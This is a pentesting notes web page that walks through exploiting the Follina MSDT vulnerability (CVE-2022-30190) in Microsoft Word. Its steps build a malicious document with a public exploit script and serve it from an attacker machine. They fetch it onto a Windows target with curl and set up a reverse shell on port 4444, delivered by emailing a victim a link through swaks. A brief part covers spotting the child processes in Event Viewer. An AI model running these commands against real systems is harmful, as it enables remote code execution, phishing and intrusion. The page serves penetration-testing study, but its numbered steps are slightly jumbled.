<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Microsoft Word Pentesting - readloud.org</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Microsoft Word Pentesting", url: "#_top", children: [
              {title: "Follina MSDT (CVE-2022-30190)", url: "#follina-msdt-cve-2022-30190" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="microsoft-word-pentesting">Microsoft Word Pentesting</h1>
<h2 id="follina-msdt-cve-2022-30190">Follina MSDT (CVE-2022-30190)</h2>
<p>Microsoft Support Diagnostic Tool (MSDT) is vulnerable with Follina.</p>
<h3 id="1-download-the-payload-in-local-machine">1. Download the Payload in Local Machine</h3>
<p>Clone the payload from <a href="https://github.com/JohnHammond/msdt-follina">msdt-follina</a>.</p>
<h3 id="2-create-the-maldoc-in-local-machine">2. Create the Maldoc in Local Machine</h3>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># -i: interface name</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>python3<span class="w"> </span>follina.py<span class="w"> </span>-i<span class="w"> </span>eth0
</span></code></pre></div>
<p>Then a new maldoc named ‚Äúfollina.doc‚Äù will be created in the current directory.<br />
Now you‚Äôve started the web server.</p>
<h3 id="3-open-another-web-server-in-local-machine">3. Open Another Web Server in Local Machine</h3>
<p>Open another terminal  and move to the msdt-follina directory,  then start web server to transfer the maldoc to target machine.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">3456</span>
</span></code></pre></div>
<h3 id="4-transfer-the-maldoc-to-target-machine">4. Transfer the Maldoc to Target Machine</h3>
<p>In target Windows machine, open powershell and execute the following command.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">cd</span><span class="w"> </span>~/Desktop
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>curl<span class="w"> </span>http://&lt;local-ip&gt;:3456/follina.doc<span class="w"> </span>-o<span class="w"> </span>follina.docx
</span></code></pre></div>
<h3 id="5-open-the-maldoc">5. Open the Maldoc</h3>
<p>In target machine, open the maldoc you transfered.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>.<span class="se">\f</span>ollina.docx
</span></code></pre></div>
<h3 id="6-check-the-process-explorer-of-sysinternals-in-target-machine">6. Check the Process Explorer of Sysinternals in Target Machine</h3>
<p>Find interesting processes in the Process Explorer.</p>
<h3 id="7-check-the-event-viewer-in-target-machine-to-detect-suspicious-processes">7. Check the Event Viewer in Target Machine to Detect Suspicious Processes</h3>
<ol>
<li>
<p>Go to "View" -&gt; "Use Quick Filter"</p>
</li>
<li>
<p>A search bar should appear on top of the logs. Choose ‚ÄúFind Event ID‚Äù on the right of the search bar, and enter ‚Äú4688‚Äù(it means that ‚Äúa new process has been created‚Äù) in a search bar.</p>
</li>
<li>
<p>Open the Find (Ctrl+F) and enter ‚Äúwinword‚Äù. Then check the contents of results.</p>
</li>
<li>
<p>Go to Options ‚Üí Advanced Options</p>
</li>
<li>
<p><strong>Reverse Shell via SMTP</strong></p>
<p>If the target uses SMTP, you may be able to reverse shell using it.<br />
Start the exploit to wait for reverse connections.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>follina.py<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>-r<span class="w"> </span><span class="m">4444</span>
</span></code></pre></div>
<p>Send e-mail to the target machine via SMTP using <a href="https://github.com/jetmore/swaks">swaks</a>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@vulnerable.com<span class="w"> </span>--from<span class="w"> </span>test@test<span class="w"> </span>--server<span class="w"> </span>mail.vulnerable.com<span class="w"> </span>--body<span class="w"> </span><span class="s2">&quot;http://&lt;local-ip&gt;/&quot;</span>
</span></code></pre></div>
</li>
</ol>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/service/microsoft-word-pentesting.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>